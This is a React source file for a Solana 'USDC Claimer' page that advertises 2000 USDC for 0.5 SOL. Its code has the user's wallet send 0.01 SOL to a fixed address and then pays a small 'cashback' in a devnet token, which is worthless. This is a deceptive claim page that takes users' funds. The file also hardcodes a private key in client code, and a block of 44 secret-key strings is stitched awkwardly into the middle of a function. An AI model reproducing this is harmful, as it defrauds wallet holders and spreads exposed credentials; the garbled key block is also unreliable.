/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "4fYL4nuP1C9hq5NLRdwFth2Zum2BQADrktuvq1jjMhmh1PjM3e3pLDb8U89G1gkFMKV1y9EqDazbxUW7oczTLEpa"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "676TuEKsFotJYzw5fHjyLBqzS2Kw1w9FFXUDJMYNQk9iezCYhitNaEbUZ2zxRURuw9kFfuumxynySE76EX1yaMAA",
  "key1": "666RSpqrCFGM3ynrM1D2YoxiY69G8WjJbd8D3FCWjrZTKL7GW5zM27qC28gy43hDiR4VyW1mWEQN63jWAQ6xEKFA",
  "key2": "3JbJMdPvfctF6sFC5N7YPLkYSy2HveVQP3Gg39kKyP6853qa29TnzACfrTkk3FhN7wJuNLRPbeKVF3WyonMPKy7n",
  "key3": "Zs5odKafUyuRL1NqRgTRhSmM8W1vrCr8ypohXrfAodsYsVLd21VaPEQ2eg9a3Hz32cdibaCdBGZu9BMnq8fXeyK",
  "key4": "4F4kmuxGSN1nmPfRFxZptedn8co6eLEXEaFg5c4jyBj4cjZ21LQvwEA3mL6UnniBqiEKBXC3gHhsztq57vFVJtfZ",
  "key5": "5yrqbWJtTxsyZodEowVb7ifkJyedVbincvXknU9ZBhV3oh7ZWXzBgCPKwERkQGWGooMQyLoeRE7YpfAbz5DRAzit",
  "key6": "2z2rUKDJFqVzM1eKCXhCJycFrVA1u6LE3GZKfBcc33DpswwHCG6aVKzoVcbfWAe6nA92AY2WBdjuoX9KMCwMXm4P",
  "key7": "CZ974FYgSRpk7YGVT5RiHQ8ruUPa1reLXrZgZPJsf26aSGm2dMZbqJEqBfWbxqt7tTeZV7zGTJApVmnrzZMDkgV",
  "key8": "2AmTJVYY2k587EJRhNhf8JPpSoz8uBTcJoNxkAQRxVm1e841wx6d6dfduVhXF6iKisNXP1k2Q3DVKpjpxyJB6uZ1",
  "key9": "529prur3m7P8sASSdxcGkiF4Cfx6viiAtsvFZfeg5Lo4ZfYTuJfX5RfkWftkkqqa9TYNscdnTz8aeSb3RVWnpZ5r",
  "key10": "21Z4NqnEbTcqusmf35uiRWXn6SguwXcEWnqCn38EH8YCitVTNJCT3p7EXfcbrVt27fWnMWg4GqUdbXgz1Qh2q3Vq",
  "key11": "33L4jBinaTVw9yisbkx757ZdRrKdukYx6kheg6qJe427qhsa7WhFjYUBbDWU75p9sjKp2nBXkjpVFGatKLTt3Q5g",
  "key12": "5QATLfsipzsnBneYDuPJuUnfzde5814j1Ph99hLpkhNLDKP6kV2pypPHWmjspWAKQWs5XvYuzhBZsGBo6eBJZnwZ",
  "key13": "2pywxVp1RF8szVG8WytxKz5omm5QX79szkrAJfg5SPdtnqMeLMzrQWXM3WhTCQVQFARyNFTbM6qHXsVJfm8nTUJf",
  "key14": "2PfSrZejiqs1hrevK2YXRbKs9ZFFK73SVfUAcavCLsWxvuBpiYh9ky63NsqneFZe7JnfMQWAA3Rt2n3eU7a7ycwp",
  "key15": "3VyaAdisERqKgXn6ZTStdEAVGykfC7p8JKeSNLhQCqq2JbwBHgdvs753jFSBBqDwS6NCyJrVf4UF6b2AgnwSd2LG",
  "key16": "atQC7vJYBqF27ZFUovP6HifW344rJJzUPBMFHNjvCRvNYH1gLJk4cvP2m2Sgy2pkXdbrF2ZoCr5cDBt2CCFNCfZ",
  "key17": "pjJobcZjiZbEdhfdTPYccsK8U4LwwzJHHT3JhZ1EhPjJXPRBDWd9vMEVTCDrJpsEKrv6os8X9kUAZRaoTYHhwF3",
  "key18": "5ABWPkMibVTqGVSU5Whb6DUViNZNPaVf9t1yaQeTtKLZauKCpbEYerg5KDeWo428WzD7qQhopruHoJZqyrnNjEao",
  "key19": "2eVza84sFCg2wpAEYHBZhveMiMRhv8ALVqsb7vcLPWfNdA44uGa8Nw6w7UV5SbgHxRNCBRcxhER5gci5xRoM5fRR",
  "key20": "3nVrcpahqr3w8onnv3Z9aGV5RNSdB4y6BPJ5Zhd2n6HvRobkae7jh7aP9B4Yme8FmDF3KJKgtYMXhz8DmMMD5FVo",
  "key21": "d2UwZ4s3Pr5bYTCWWP9FrTiYuapCNYkz2CvZ85wseLYYpThAdii7BnK8MLJfc2FqqFrpyh7tykCpzqDMgYhWg8k",
  "key22": "voWF9kqV5KKCNx4uSSL81p1ivUnmfjVfkP7JREPREMhYEX1sVuYUJYt1sVSLpjTjYLHUFroTsVGsS6PpbvUvDfV",
  "key23": "5qKjMAav6QfexAAj1yNvZUYMV4TTmkRmiDYyrCp1XfGq7oJNiKod7uHW6qqyMtwiDjJXZWXgjqE4QjZyGa3pKVBq",
  "key24": "nF14BEGnL3qHCJCG1zKVT7b2H1CsdQwt1MCPGbvVs7bJ5ThH8A2X9MNWcJV7sdjNbsjhn8d5LKArr8xVAv5y1UD",
  "key25": "2wpC73CWZUXemrzKjBsrd9W2kddoK5NWykWKEXgANdLu8HfYe83zgq69ngfL7hKJJzrDwRFhqggHNTABbiHYbDm3",
  "key26": "36MhkNVecaBU4yLwNVYKPEbHCSaXQ5DT2ac7LQknktBwXnsTWLeRg8n1SreDjW4y1H1WpuiywuzaJaxSBD1QJTjZ",
  "key27": "54m6hFzpRaKga6C3pJ5QDKfnF6fbXrX6VUcK5AVzqxrpBcVd9HVzHekN6ufwtDmoAz9NCwQigvo4JNaZvjfqu8PK",
  "key28": "rTNYmMQ5DKbQuRnJB1vasf1tJMp1h1zqmB58Ce3PNUZCayWWoivPyKbuu5w4GdyrCs7Nngx1PTV96US47bgx3md",
  "key29": "2WpqHiePeQu5FXkABxgz43nojqmneYLfmQvVdVx91YWGqXbwJiZKcMtXsFMoQZccd5guKfasvVEXJYHtfmEbHDR1",
  "key30": "H4389eYg2quPm7kovPUrVyHVrzLsRsLKAZkL3SSHoHj5HNVaKpA9RHhYP229JgnqbxnRn728qUN9e4Zg8K4rhp3",
  "key31": "3gBoz1NFiyEGnUjoSmTswGk9rFWDL1k5z5ocnsGdZrP5srgqgvo5JZRnMRdxwWcvsyhtXfy4UiYAqSdsSXGpJ9tv",
  "key32": "3MhvBmvbCWrJ5KJQDHvT18xtuTnbYjj6rPvLnxBXJZygL33UE1Ga4tjU92ZRKFe6Yb3cV9Za7WYjg2KwrQr3YK9N",
  "key33": "5WevncqyGwYGGrBgp6VLQGeEj2LddGu8y4sPo5d5ZwUZhqJpt61KKvBDUm6gg4s7ZjDUwXjKk2HVKs6jKY6E9KvQ",
  "key34": "4b1RShMxvFotMDcEgztqBM4xbDiYgXNCH9ihabXKG23gjJmcHKvHjMUMDixCWSMXVC9sB65dHzWvo4hsxBH6rmUF",
  "key35": "4jw2iRpYQxBo2zPsUirdkCeZqt2Xuzwa44J9sDCQnXmAsCnsCw6p33WrHsM81SzPHt2GhAbkq67pG4kEh9JGjqos",
  "key36": "478PGHeJjT3Xg8aiCYj527asYaEsmjvoSim9tgqpFpjjQ5BJQVBQ2WMtwjhoDUV46qrhUwe6tRvAteuMUFZnvT8U",
  "key37": "3TiwoXsGmocf7WSk8GejrSJtf1cRkyBjjQ6SnBSm91qtUL4pgT9KT7rC9RdHaugHwZAZJadxroZFqYWP6eCdjLLx",
  "key38": "56fYxGa48Y35qkVLHiKAgRnJXTn2iwL93kZYzrkFDpWUtizXw2sYGMu6UzkmTmjhJfAj552GvBWj7bKQRHKLd1Ju",
  "key39": "47FfuoMWCJqAvkx9HWn821Agohp1wFBgK3JZ2jxPDqobpNQz6hPzdeZMDszrUCqnnwhpC1kWz24k6LxJoo1Q1cgB",
  "key40": "4wkSSfF8pKLULaddB1LvYzW59NgxCX3EBb65piYQ4cEtNdbzKRiTz7yJvVU3XtqpNziymGvwgMrEzdNR1PaqmA7u",
  "key41": "2XVqViWiD94uWnQiTij1oNuhBXUXxCwqqaX9sN8fru4heSof58HYvHw9qnsHz1w1TCbjxG2GgcY5sDuZWNPFL2pL",
  "key42": "62bzr2RUU9nXJ7NxvxCXmD3wxpuaoiMNH9QY1AostceaviAgRVikhRUmDkbJnzChxbHMfwBi5PtXD2wKa2W7TrFa",
  "key43": "5yysp2BEFmVAbJhqkiu5v9aKW2fydKyp5AdjiCdgXKrff254zCCcxUgh3WBA8i1VLtAJXFPjY4okbwa2rNr3FvEX"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
